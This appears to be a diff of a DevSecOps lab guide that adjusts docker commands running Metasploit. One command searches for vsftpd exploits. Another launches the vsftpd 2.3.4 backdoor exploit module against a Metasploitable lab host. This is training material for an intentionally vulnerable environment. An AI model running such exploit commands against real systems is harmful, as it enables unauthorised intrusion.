@@ -97,7 +97,7 @@ For Metasploitable services, search Metasploit:
 docker run --rm -it \
   --network devsecops-lab \
   metasploitframework/metasploit-framework:latest \
-  ./msfconsole -q -x "search type:exploit name:vsftpd; exit"
+  -q -x "search type:exploit name:vsftpd; exit"
 ```
 
 For Juice Shop, look at the OWASP Top 10 categories you covered in Lab 4.
@@ -122,7 +122,7 @@ Example for Metasploitable, FTP backdoor (using the Metasploit container):
 docker run --rm -it \
   --network devsecops-lab \
   metasploitframework/metasploit-framework:latest \
-  ./msfconsole -q -x "
+  -q -x "
     use exploit/unix/ftp/vsftpd_234_backdoor;
     set RHOSTS metasploitable;
     run;
